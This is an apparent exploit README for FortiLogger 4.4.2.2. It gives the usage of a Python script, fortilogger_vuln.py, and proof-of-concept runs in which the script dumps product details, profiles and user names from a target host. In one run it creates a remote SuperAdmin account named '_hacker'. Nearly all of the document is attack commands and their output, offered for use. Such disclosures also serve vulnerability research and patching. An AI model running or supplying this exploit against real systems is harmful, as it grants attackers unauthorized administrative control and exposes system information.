
## FortiLogger | Log and Report System - Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

* Date: 30-01-2021
* Exploit Author: Berkan Er <b3rsec@protonmail.com>
* Vendor Homepage: https://www.fortilogger.com/
* Version: 4.4.2.2
* Tested on: Windows 10 Enterprise x64
* A remote attacker can be create an user with SuperAdmin profile 

#### Usage:
```
python3 fortilogger_vuln.py                         

FortiLogger | Log and Report System - v4.4.2.2
Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

Berkan Er <b3rsec@protonmail.com>
@erberkan

Usage:
python3 fortilogger_vuln.py < IP > < PORT > < CREATE USER {TRUE / FALSE} >

IP:	IP Address of FortiLogger host
PORT:	Port number of FortiLogger host
TRUE:	Create User
FALSE:	Show Product Infos

Example: python3 fortilogger_vuln.py 192.168.1.10 5000 TRUE

```

#### POC: 
```
python3 fortilogger_vuln.py 192.168.16.128 5000 FALSE

FortiLogger | Log and Report System - v4.4.2.2
Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

Berkan Er <b3rsec@protonmail.com>
@erberkan

[*] Status code:  200
[*] Product Version:  4.4.2.2

*** Product Infos=
{
  "_t": "ProductOptions",
  "_id": {
    "$oid": "60157d427f711605414a2de4"
  },
  "AddDate": {
    "$date": 1612021058799
  },
  "UpdateDate": {
    "$date": 1612024343170
  },
  "IsActive": false,
  "UserId": "0",
  "IpAddress": "192.168.16.128",
  "Version": "4.4.2.2",
  "ProductId": "FLOG1327013824951216",
  "ProcessorId": "1F8BFBFF000306D4",
  "DiskId": "VMWare NVME_0000",
  "UUId": "6FD54D56-5A22-FB3A-367A-DB738CFB01B4",
  "BiosId": "VMware-56 4d d5 6f 22 5a 3a fb-36 7a db 73 8c fb 01 b4",
  "SendError": true,
  "DatabasePath": "C:\\fortilogger",
  "ProgramPath": "C:\\Program Files\\RZK\\Fortilogger",
  "DefaultLang": "en",
  "LatestVersion": "4.4.2.2",
  "SendData": true,
  "MaxDevicePerProduct": 5,
  "ListenerPort": 514,
  "VdomMode": false,
  "UIPort": 5000
}

*** Profiles=
[
  "superadmin_profile",
  "admin_profile",
  "hotspot_profile"
]

*** Users=
[
  "admin",
  "hotspot",
  "berkan"
]
[+] It seems vulnerable !
KTHNXBYE!
```
```
python3 fortilogger_vuln.py 192.168.16.128 5000 TRUE

FortiLogger | Log and Report System - v4.4.2.2
Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

Berkan Er <b3rsec@protonmail.com>
@erberkan

[*] Status code:  200
[*] Product Version:  4.4.2.2
[+] It seems vulnerable !
[*] STAUTS CODE: 200
[!] User has been created ! 
Username: _hacker
Password: _hacker

*** Users=
[
  "admin",
  "hotspot",
  "berkan",
  "_hacker"
]
KTHNXBYE!
```